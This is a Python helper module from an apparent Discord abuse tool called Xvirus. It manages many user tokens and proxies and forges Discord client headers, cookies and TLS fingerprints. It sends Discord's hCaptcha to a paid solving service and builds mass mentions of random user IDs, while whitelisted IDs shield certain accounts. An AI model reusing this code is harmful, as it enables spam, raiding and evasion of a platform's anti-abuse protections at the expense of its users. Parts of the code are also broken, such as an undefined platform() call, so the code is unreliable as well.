import base64
import ctypes
import getpass
import json
import os
import random
import re
import string
import sys
import time
import types
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from time import sleep
import httpx
import requests
import tls_client
from capsolver_python import HCaptchaTask, capsolver
from colorama import Fore
from decimal import Decimal
from src import *

THIS_VERSION = "2.0.0"
whitelisted = ["1157603083308761118", "1157425827517055017", "1146496916419526727", "1157400926877925558", "1156946611646247013", "1149731357656883311"]

class Config:
    def __init__(self):
        self.folder_path = os.path.join(os.getenv('LOCALAPPDATA'), 'xvirus_config')
        self.file = os.path.join(self.folder_path, 'config.json')
        os.makedirs(self.folder_path, exist_ok=True)
        self.xvirus_files = ['xvirus_tokens', 'xvirus_proxies', 'xvirus_usernames', 'xvirus_ids']
        for file_name in self.xvirus_files:
            file_path = os.path.join(self.folder_path, file_name)
            if not os.path.exists(file_path):
                with open(file_path, 'w') as file:
                    pass
        self.content = {
            "xvirus_key": "",
            "use_proxies": False,
            "use_captcha": False,
            "captcha_key": "",
            "debug_mode": False
        }
        if not os.path.exists(self.file):
            with open(self.file, 'w') as f:
                json.dump(self.content, f, indent=3)
        else:
            pass
        self.config_data = self._load('config.json')

    def _load(self, file_name):
        file_path = os.path.join(self.folder_path, file_name)
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                return json.load(file)
        except FileNotFoundError:
            return {}
        except json.JSONDecodeError as e:
            print(f"JSON decoding error: {e}")
            return {}

    def _save(self, file_name, data):
        file_path = os.path.join(self.folder_path, file_name)
        with open(file_path, 'w') as file:
            json.dump(data, file, indent=4)

    def _set(self, key, value):
        self.config_data[key] = value
        self._save('config.json', self.config_data)

    def _get(self, key, default=None):
        return self.config_data.get(key, default) if default is not None else self.config_data.get(key)

    def _remove(self, key):
        if key in self.config_data:
            del self.config_data[key]
            self._save('config.json', self.config_data)

    def add(self, file_name, data):
        if file_name not in self.xvirus_files:
            raise ValueError(f"Error: {file_name} is not a valid file name.")
        
        file_path = os.path.join(self.folder_path, file_name)
        with open(file_path, 'a') as file:
            file.write(data + '\n')

    def read(self, file_name):
        if file_name not in self.xvirus_files:
            raise ValueError(f"Error: {file_name} is not a valid file name.")
        
        file_path = os.path.join(self.folder_path, file_name)
        try:
            with open(file_path, 'r') as file:
                return file.read().strip()
        except FileNotFoundError:
            raise FileNotFoundError(f"Error: {file_name} not found.")
    
    def reset(self, file_name):
        if file_name not in self.xvirus_files:
            raise ValueError(f"Error: {file_name} is not a valid file name.")
        
        file_path = os.path.join(self.folder_path, file_name)
        try:
            with open(file_path, 'w') as file:
                pass
        except Exception as e:
            print(f"{e}")

config = Config()

class Output:
    def __init__(self, level, config, token=None):
        self.level = level
        self.config = config
        self.token = token
        self.color_map = {
            "info": (Fore.BLUE, "<~>"),
            "bad": (Fore.RED, "<!>"),
            "good": (Fore.GREEN, "<*>"),
            "cap": (Fore.CYAN, "<CAP>")
        }

    def should_hide(self):
        return not self.config._get('debug_mode', True)

    def hide_token(self, text):
        if self.should_hide() and self.token:
            token_length = len(self.token)
            if token_length >= 10:
                censored_part = '*' * 10
                text = text.replace(self.token[-10:], censored_part)
        return text

    def notime(self, *args, **kwargs):
        color, text = self.color_map.get(self.level, (Fore.LIGHTWHITE_EX, self.level))
        base = f"{color}{text.upper()}"
        for arg in args:
            arg = self.hide_token(arg)
            base += f" {arg}"
        if kwargs:
            for key, value in kwargs.items():
                value = self.hide_token(value)
                base += f" {key}={value}"
        print(base)

    def log(self, *args, **kwargs):
        color, text = self.color_map.get(self.level, (Fore.LIGHTWHITE_EX, self.level))
        time_now = datetime.now().strftime("%H:%M:%S")
        base = f"{Fore.RED}│{Fore.BLUE}{time_now}{Fore.RED}│ {color}{text.upper()}"
        updated_args = []

        for arg in args:
            arg = self.hide_token(arg)
            updated_args.append(arg)

        for arg in updated_args:
            base += f" {arg}"

        if kwargs:
            for key, value in kwargs.items():
                value = self.hide_token(value)
                base += f" {key}={value}"
        print(base)

    @staticmethod
    def PETC():
        Output("info", config).notime(f"Press ENTER to continue")
        input()
        __import__("main").gui.main_menu()
    
    @staticmethod
    def SetTitle(text):
        system = os.name
        if system == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(f"{text} - Discord API Tool | https://xvirus.lol | Made By Xvirus™")
        else:
            pass
    
    @staticmethod
    def WebText():
        r = requests.get("https://cloud.xvirus.lol/webtext.txt")
        text = r.text.strip()
        print(f"{Fore.RED}Text Of The Week:\n {Fore.BLUE}{text}")
        sleep(2.5)

class DiscordProps:
    @staticmethod
    def get_build_number():
        scripts = re.compile(r'/assets/.{20}.js', re.I).findall(requests.get("https://discord.com/app", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).text)
        scripts.reverse()
        for v in scripts:
            content = requests.get(f"https://discord.com{v}", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).content.decode()
            if content.find("build_number:\"") != -1:
                return re.compile(r"build_number:\"(.*?)\"", re.I).findall(content)[0]


    @staticmethod       
    def getFingerprint() -> str:
        res = requests.get(
            'https://discord.com/api/v9/experiments'
        )
        requests.cookies = res.cookies
        return res.json()['fingerprint']
        
    user_agents = [
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Whale/3.22.205.18 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
        'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5823.221 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.60']

    lang = [
        "de,de-DE;q=0.9",
        "en,en-US;q=0.9",
        "es,es-ES;q=0.9",
        "fr,fr-FR;q=0.9",
        "ja;q=0.9",
        "ru,ru-RU;q=0.9",
        "pt-BR;q=0.9",
        "tr;q=0.9",
        "ar,ar-SA;q=0.9",
        "zh,zh-CN;q=0.9"]

    brands = [
        """Not?A_Brand";v="8", "Chromium";v="108""",
        """Not?A_Brand";v="8", "Firefox";v="92""",
        """Not?A_Brand";v="8", "Safari";v="15""",
        """Edge";v="96", "Chromium";v="108""",
        """Brave";v="1.31", "Chromium";v="108""",
        """Opera";v="88", "Chromium";v="108""",
        """Internet Explorer";v="11", "Chromium";v="108"""]

    channels = [
        "ptb", 
        "canary", 
        "stable"] 

    times = [
        "Europe/Berlin",
        "America/New_York",
        "Asia/Tokyo",
        "Australia/Sydney",
        "America/Los_Angeles",
        "Africa/Cairo",
        "Asia/Dubai",
        "America/Mexico_City",
        "Pacific/Auckland",
        "America/Chicago"]

    zone = random.choice(times)
    channels = ["ptb", "canary", "stable"] 
    user_agent = random.choice(user_agents)
    language = random.choice(lang)
    channel = random.choice(channels)  
    brand = random.choice(brands)
    buildNumber = get_build_number()
    x_super_properties = base64.b64encode(json.dumps({
        "os": "Windows",
        "browser": "Discord Client",
        "release_channel": channel,
        "client_version": "1.0.9011",
        "os_version": "10.0.22638",
        "os_arch": "x64",
        "system_locale": "en",
        "client_build_number": buildNumber,
        "native_build_number": 30306,
        "client_version_string": "1.0.9011",
        "os_version_string": "10.0.22638",
        "os_arch_string": "x64"}).encode()).decode()
    
    default_headers = {
        'authority': 'discord.com',
        'accept': '*/*',
        'accept-language': language, 
        'origin': 'https://discord.com',
        'referer': 'https://discord.com/',
        'sec-ch-ua': brand,
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user_agent,
        'x-debug-options': 'bugReporterEnabled',
        'x-discord-locale': 'en-US',
        'x-discord-timezone': zone,
        'x-super-properties': x_super_properties,}

os.system('cls')
Output("info", config).notime("Getting Discord Info..")
Output("info", config).notime(f"Build Number: {Fore.RED}{DiscordProps.get_build_number()}")
Output("info", config).notime(f"Finger Print: {Fore.RED}{DiscordProps.getFingerprint()}")
Output("info", config).notime(f"User Agent: {Fore.RED}{DiscordProps.user_agent[:80]}...")

def platformr():
    platforms = [
        "Windows",
        "IOS",
        "Android",
        "MacOS",
        "Linux",
        "Ubuntu"
        ]
    platform = random.choice(platforms)
    return platform
def useragent():
    user_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"
        ]

    user_agent = random.choice(user_agents)
    return user_agent
def buildnm():
        scripts = re.compile(r'/assets/.{20}.js', re.I).findall(requests.get("https://discord.com/app", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).text)
        scripts.reverse()
        for v in scripts:
            content = requests.get(f"https://discord.com{v}", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0'}).content.decode()
            if content.find("build_number:\"") != -1:
                return re.compile(r"build_number:\"(.*?)\"", re.I).findall(content)[0]
def content() -> int:
    content_length = random.randrange(0,200)
    return content_length
browsers = ["ptb", "canary", "stable"]  
buildNumber = buildnm()
x_super_properties = base64.b64encode(json.dumps({
        "os": platform(),
        "browser": "Discord Client",
        "release_channel": random.choice(browsers),
        "client_version": "1.0.9011",
        "os_version": "10.0.22638",
        "os_arch": "x64",
        "system_locale": "en",
        "client_build_number": buildNumber,
        "native_build_number": 30306,
        "client_version_string": "1.0.9011",
        "os_version_string": "10.0.22638",
        "os_arch_string": "x64"}).encode()).decode()
def language():
    lang = [
        "de,de-DE;q=0.9",
        "en,en-US;q=0.9",
        "es,es-ES;q=0.9",
        "fr,fr-FR;q=0.9",
        "ja;q=0.9",
        "ru,ru-RU;q=0.9",
        "pt-BR;q=0.9",
        "tr;q=0.9",
        "ar,ar-SA;q=0.9",
        "zh,zh-CN;q=0.9"
        ]
    language = random.choice(lang)
    return language
def brand():
    brands = [
        """Not?A_Brand";v="8", "Chromium";v="108""",
        """Not?A_Brand";v="8", "Firefox";v="92""",
        """Not?A_Brand";v="8", "Safari";v="15""",
        """Edge";v="96", "Chromium";v="108""",
        """Brave";v="1.31", "Chromium";v="108""",
        """Opera";v="88", "Chromium";v="108""",
        """Internet Explorer";v="11", "Chromium";v="108"""
    ]
    brand = random.choice(brands)
    return brand
def local():
    locales = [
        "en-US",
        "de-DE",
        "es-ES",
        "fr-FR",
        "ja",
        "ru-RU",
        "pt-BR",
        "tr",
        "ar-SA",
        "zh-CN"
    ]
    local = random.choice(locales)
    return local
def timezone():
    times = [
        "Europe/Berlin",
        "America/New_York",
        "Asia/Tokyo",
        "Australia/Sydney",
        "America/Los_Angeles",
        "Africa/Cairo",
        "Asia/Dubai",
        "America/Mexico_City",
        "Pacific/Auckland",
        "America/Chicago"
    ]
    zone = random.choice(times)
    return zone



class Header:
    @staticmethod
    def tls_session() -> tls_client.Session:
        client = tls_client.Session(
            client_identifier=f"chrome_{random.randint(110, 116)}",
            random_tls_extension_order=True,
            ja3_string="769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0",
            h2_settings={
                "HEADER_TABLE_SIZE": 65536,
                "MAX_CONCURRENT_STREAMS": 1000,
                "INITIAL_WINDOW_SIZE": 6291456,
                "MAX_HEADER_LIST_SIZE": 262144
            },
            h2_settings_order=[
                "HEADER_TABLE_SIZE",
                "MAX_CONCURRENT_STREAMS",
                "INITIAL_WINDOW_SIZE",
                "MAX_HEADER_LIST_SIZE"
            ],
            supported_signature_algorithms=[
                "ECDSAWithP256AndSHA256",
                "PSSWithSHA256",
                "PKCS1WithSHA256",
                "ECDSAWithP384AndSHA384",
                "PSSWithSHA384",
                "PKCS1WithSHA384",
                "PSSWithSHA512",
                "PKCS1WithSHA512",
            ],
            supported_versions=["GREASE", "1.3", "1.2"],
            key_share_curves=["GREASE", "X25519"],
            cert_compression_algo="brotli",
            pseudo_header_order=[":method", ":authority", ":scheme", ":path"],
            connection_flow=15663105,
            header_order=["accept", "user-agent", "accept-encoding", "accept-language"]
        )
        if config._get("use_proxies"):
            proxy = ProxyManager.clean_proxy(ProxyManager.random_proxy())
            if isinstance(proxy, str):
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
            elif isinstance(proxy, dict):
                proxy_dict = proxy

            client.proxies = proxy_dict
        
        return client

    @staticmethod       
    def getFingerprint() -> str:
        res = requests.get(
            'https://discord.com/api/v9/experiments'
        )
        requests.cookies = res.cookies
        return res.json()['fingerprint']

    @staticmethod
    def get_cookies(session, headers):
        cookies = dict(
            session.get("https://discord.com", headers=headers).cookies
        )

        cookies["__cf_bm"] = (
            "0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-"
            "AbkAwOxGrGl9ZGuOeBGIq4Z+ss0Ob5thYOQuCcKzKPD2xvy4lrAxEuRAF1Kopx5muqAEh2kLBLuED6s8P0iUxfPo+IeQId4AS3ZX76SNC5F59QowBDtRNPCHYLR6+2bBFA=="
        )
        cookies["locale"] = "en-US"

        return cookies

    @staticmethod
    def get_client(token):
        default_headers = DiscordProps.default_headers.copy()
        default_headers["authorization"] = token
        fingerprint = Header.getFingerprint()
        session = Header.tls_session()
        cookie = Header.get_cookies(session, headers=default_headers)
        default_headers["x-fingerprint"] = fingerprint
        default_headers["cookie"] = (
            f'__dcfduid={cookie["__dcfduid"]}; '
            f'__sdcfduid={cookie["__sdcfduid"]}; '
            f'__cfruid={cookie["__cfruid"]}; '
            f'__cf_bm={cookie["__cf_bm"]}; '
            f'locale={cookie["locale"]}'
        )
    
        return session, default_headers, cookie

class ProxyManager:
    def get_proxies():
        f = config.read('xvirus_proxies')
        proxies = f.strip().splitlines()
        proxies = [proxy for proxy in proxies if proxy not in [" ", "", "\n"]]
        return proxies
    
    def random_proxy():
        try:
            return random.choice(ProxyManager.get_proxies())
        except:
            return {}

    def clean_proxy(proxy):
        if isinstance(proxy, str):
            parts = proxy.split(':')
            if '@' in proxy or len(parts) == 2:
                return proxy
            elif len(parts) == 4:
                return f'{parts[2:]}@{parts[:2]}'
            elif '.' in parts[0]:
                return f'{parts[2:]}@{parts[:2]}'
            else:
                return f'{parts[:2]}@{parts[2:]}'
        elif isinstance(proxy, dict):
            http_proxy = proxy.get("http") or proxy.get("https")
            https_proxy = proxy.get("https") or proxy.get("http")
            if http_proxy or https_proxy:
                return {
                    "http://": http_proxy,
                    "https://": https_proxy
                }
            elif proxy in [dict(), {}]:
                return {}
        return proxy
    
class goodheader:
    def __init__(self) -> None:
        self.session = tls_client.Session(client_identifier="chrome112", random_tls_extension_order=True)
        self.headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": language(),
            "cache-control": "no-cache",
            "content-length": f"{content()}",
            "content-type": "application/json",
            "origin": "https://discord.com",
            "pragma": "no-cache",
            "sec-ch-ua": brand(),
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": platformr(),
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": local(),
            "x-discord-timezone": timezone(),
            "x-super-properties": x_super_properties
        }
    def get_cookies(self) -> None:
        site = self.session.get("https://discord.com")
        cookies = site.cookies.get_dict()
        cookies["__cf_bm"] = (
            "0duPxpWahXQbsel5Mm.XDFj_eHeCKkMo.T6tkBzbIFU-1679837601-0-"
            "AbkAwOxGrGl9ZGuOeBGIq4Z+ss0Ob5thYOQuCcKzKPD2xvy4lrAxEuRAF1Kopx5muqAEh2kLBLuED6s8P0iUxfPo+IeQId4AS3ZX76SNC5F59QowBDtRNPCHYLR6+2bBFA=="
        )
        cookies["locale"] = local()
        return cookies
    def getfingerprint(self) -> None:
        r = self.session.get("https://discordapp.com/api/v9/experiments")
        fingerprint = r.json()["fingerprint"]
        return fingerprint

goodheader = goodheader()
fingerprint = goodheader.getfingerprint()
cookies = "; ".join([f"{key}={value}" for key, value in goodheader.session.cookies.items()])
headerss = goodheader.headers
session = goodheader.session

def bestheader(token):
    header = {
        "Authorization": token,
        "cookie": cookies,
        "x-fingerprint": fingerprint
    }
    headerss.update(header)
    return headerss

class TokenManager:
    @classmethod
    def get_tokens(cls):
        f = config.read('xvirus_tokens')
        tokens = f.strip().splitlines()
        tokens = [token for token in tokens if token not in [" ", "", "\n"]]
        return tokens

    @classmethod
    def custom_path(cls, custom_path):
        try:
            with open(custom_path, 'r') as file:
                tokens = file.read().strip().splitlines()
                tokens = [token for token in tokens if token.strip()]
                return tokens
        except FileNotFoundError:
            Output("bad", config).notime(f"File not found: {custom_path}")
            return None

    @staticmethod
    def OnlyToken(tokenn):
        r = re.compile(r"(.+):(.+):(.+)")
        if r.match(tokenn):
            return tokenn.split(":")[2]
        else:
            token = tokenn
        return token
    
    @classmethod
    def delete_token(cls, token):
        f = Config.read('xvirus_tokens')
        new_f = f.readlines()
        f.seek(0)
        for line in new_f:
            if token not in line:
                f.write(line)
        f.truncate()
    
    @classmethod
    def get_random_token(cls):
        tokens = cls.get_tokens()
        if tokens:
            return random.choice(tokens)
        else:
            return None

class utility:
    def rand_str(length:int) -> str:
        return ''.join(random.sample(string.ascii_lowercase+string.digits, length))
    
    def ask(text: str = ""):
        ask = input(f"{Fore.RED}<~> {text}: {Fore.BLUE}")
        if ask in whitelisted:
            Output("bad", config).notime(f"Answer Whitelisted! Press enter to continue...")
            input()
            __import__("main").gui.main_menu()
        elif ask == "back":
            Output("info", config).notime(f"Going Back...")
            sleep(2)
            __import__("main").gui.main_menu()
        return ask
    
    def asknum(num = ""):
        ask = input(f"{Fore.RED}<~> {num}: {Fore.BLUE}")
        if ask == "back":
            Output("info", config).notime(f"Going Back...")
            __import__("main").gui.main_menu()
        return ask
    
    def get_random_id(id):
        folder_path = os.path.join(os.getenv('LOCALAPPDATA'), 'xvirus_config')
        file = os.path.join(folder_path, 'xvirus_ids')
        with open(file, "r", encoding="utf8") as f:
            users = [line.strip() for line in f.readlines()]
        randomid = random.sample(users, id)
        return "<@" + "> <@".join(randomid) + ">"
    
    def get_ids():
        f = config.read('xvirus_ids')
        ids = f.strip().splitlines()
        ids = [idd for idd in ids if idd not in [" ", "", "\n"]]
        return ids
    
    def get_usernames():
        f = config.read('xvirus_usernames')
        users = f.strip().splitlines()
        users = [user for user in users if user not in [" ", "", "\n"]]
        return users
    
    def clear():
        system = os.name
        if system == 'nt':
            os.system('cls')
        else:
            print('\n'*120)
        return

    def message_info(message_link = None):
        if message_link is None:
            message_link = utility.ask("Message link")
        pattern = re.compile(r"^https:\/\/(ptb\.|canary\.)?discord\.com\/channels\/\d+\/\d+\/\d+$")
        if pattern.match(message_link):
            link_parts = message_link.split("/")
            guild_id, channel_id, message_id = link_parts[4], link_parts[5], link_parts[6]
            return {
                "guild_id": guild_id,
                "channel_id": channel_id,
                "message_id": message_id
            }
        else:
            Output("bad", config).notime("Invalid message link")
            return None

    def get_message(token, channel_id, message_id, session=None, headers=None, cookie=None):
        if session is None or headers is None or cookie is None:
            session, headers, cookie = Header.get_client(token)

        try:
            response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1&around={message_id}", headers=headers, cookies=cookie).json()
            return response[0]
        except Exception as e:
            return {"code": 10008}

    def get_buttons(token, guild_id, channel_id, message_id, session=None, headers=None, cookie=None):
        try:
            message = utility.get_message(token, str(channel_id), str(message_id), session, headers, cookie)

            if message.get("code") == 10008 or len(message.get("components", [])) == 0:
                return None

            buttons = []
            for component in message["components"]:
                for button in component.get("components", []):
                    buttons.append({
                        "label": button.get("label"),
                        "custom_id": button["custom_id"],
                        "application_id": message["author"]["id"],
                    })

            return buttons
        except Exception as e:
            Output("bad", config).notime(f"{e}")
            return None
    
    def get_reactions(channel_id, message_id, iteration=0):
        if iteration > 5:
            return None

        try:
            token = TokenManager.get_random_token()
            message = utility.get_message(token=token, channel_id=channel_id, message_id=message_id)
            if message.get("code") == 10008:
                return utility.get_reactions(channel_id, message_id, iteration=iteration+1)
            emojis = []
            reactions = message.get("reactions", [])

            if not reactions:
                return None

            for reaction in reactions:
                emoji = reaction["emoji"]
                emoji_name = emoji["name"]
                emoji_id = emoji["id"]

                if emoji_id is None:
                    custom = False
                    emoji_name_with_id = emoji_name
                else:
                    custom = True
                    emoji_name_with_id = f"{emoji_name}:{emoji_id}"

                emojis.append({
                    "name": emoji_name_with_id,
                    "count": reaction["count"],
                    "custom": custom
                })
            return emojis
        except Exception as e:
            Output("bad", config).notime(f"{e}")
            return None

    def CheckWebhook(webhook):
        try:
            response = requests.get(webhook)
            response.raise_for_status()
        except requests.exceptions.RequestException:
            Output("bad", config).notime(f"Invalid Webhook.")
            sleep(1)
            Output.PETC()
    
        try:
            json_data = response.json()
            j = json_data["name"]
            Output("info", config).notime(f"Valid webhook! {Fore.RED}({j})")
        except (KeyError, json.decoder.JSONDecodeError):
            Output("bad", config).notime(f"Invalid Webhook.")
            sleep(1)
    
    def make_menu(*options):
        print()
        for num, option in enumerate(options, start=1):
            label = f"    {Fore.BLUE}[{Fore.RED}{num}{Fore.BLUE}] {Fore.RED}{option}"
            print(label)
        print()

class Captcha:
    def payload(self, proxy:str=None, rqdata:str=None) -> None:
        captchaKey = config._get("captcha_key")
        p = {
            "clientKey":captchaKey,
            "task": {
                "websiteURL":"https://discord.com/",
                "websiteKey":"a9b5fb07-92ff-493f-86fe-352a2803b3df",
                "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
                "enterprisePayload":{
                    "rqdata": rqdata,
                }
            }
        }
        p['appId']="E68E89B1-C5EB-49FE-A57B-FBE32E34A2B4"
        p['task']['type'] = "HCaptchaTurboTask"
        p['task']['proxy'] = proxy 
        return p


    def __init__(self, proxy:str, siteKey:str, siteUrl:str, rqdata:str) -> None:
        self.debug = False
        self.proxy = proxy
        self.siteKey = siteKey
        self.siteUrl = siteUrl
        self.rqdata = rqdata

    def solveCaptcha(self) -> str:
        captchaKey = config._get("captcha_key")
        r = requests.post(f"https://api.capsolver.com/createTask",json=self.payload(self.proxy, self.rqdata))
        try:
            if r.json().get("taskId"):
                taskid = r.json()["taskId"]
            else:
                return None
        except:
            Output("bad", config).log("Couldn't get task id.",r.text)
            return None
        while True:
            try:
                r = requests.post(f"https://api.capsolver.com/getTaskResult",json={"clientKey":captchaKey,"taskId":taskid})
                if r.json()["status"] == "ready":
                    key = r.json()["solution"]["gRecaptchaResponse"]
                    return key
                elif r.json()['status'] == "failed":
                    return None
            except:
                Output("bad", config).log("Failed to get status.",r.text)
                return None

    def getCapBal():
        captchaKey = config._get("captcha_key")
        get_balance_resp = httpx.post(f"https://api.capsolver.com/getBalance", json={"clientKey": captchaKey}).text
        bal = json.loads(get_balance_resp)["balance"]
        Output("info", config).notime(f"Captcha Balance: ${bal}")